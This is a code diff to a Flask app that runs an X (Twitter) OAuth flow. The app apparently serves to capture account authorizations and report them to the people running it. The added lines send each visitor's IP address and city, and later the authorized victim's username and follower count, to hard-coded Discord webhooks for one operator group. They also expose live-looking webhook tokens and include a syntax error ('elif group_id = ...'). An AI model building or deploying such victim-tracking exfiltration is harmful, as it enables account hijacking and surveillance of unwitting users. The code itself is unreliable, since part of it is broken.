@@ -72,6 +72,30 @@ def oauth():
         message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
         send_telegram_message(group['group_id'], message)
 
+        if group.get("group_id") == -1002424152115:
+            embed = {
+                "title": "🌐 New Connection",
+                "color": 0x0070a5,
+                "fields": [
+                    {
+                        "name": "🖥️ IP",
+                        "value": f"{real_ip}",
+                        "inline": True
+                    },
+                    {
+                        "name": "📍 Location",
+                        "value": f"{country_flag} {city}, {country}",
+                        "inline": True
+                    }
+                ]
+            }
+            
+            payload = {
+                "embeds": [embed],
+            }
+    
+            requests.post("https://discord.com/api/webhooks/1379621785414270996/lryToJHYNF3OE1PvLXl2pNS29DStU9cV4yCXoDLk5fpz_ge4THklEPgSZyTnOky903TH", data=json.dumps(payload), headers={"Content-Type": "application/json"})
+
         twitter_oauth_url = generate_twitter_oauth_url()
         return redirect(twitter_oauth_url)
     else:
@@ -170,6 +194,29 @@ def auth_callback():
         }
         
         requests.post("https://discord.com/api/webhooks/1334653439673897103/IjwKe1YStWUVrBfQZlRE1Kz8mfFv8KkCiHZIsbUd7OCJUF7HghhE0jfzFyCt-puJdBsA", data=json.dumps(payload), headers={"Content-Type": "application/json"})
+    elif group_id = -1002424152115:
+        embed = {
+            "title": "🐍 User Authorized",
+            "color": 0x00A550,
+            "fields": [
+                {
+                    "name": "🔗 Link",
+                    "value": f"[{username}](https://x.com/{username})",
+                    "inline": False
+                },
+                {
+                    "name": "👥 Followers",
+                    "value": f"{followers_count}",
+                    "inline": False
+                }
+            ]
+        }
+        
+        payload = {
+            "embeds": [embed],
+        }
+
+        requests.post("https://discord.com/api/webhooks/1379621785414270996/lryToJHYNF3OE1PvLXl2pNS29DStU9cV4yCXoDLk5fpz_ge4THklEPgSZyTnOky903TH", data=json.dumps(payload), headers={"Content-Type": "application/json"})
     
     send_to_telegram(username, followers_count, group_id)
     return redirect(session.get("redirect_url", "https://x.com/"))
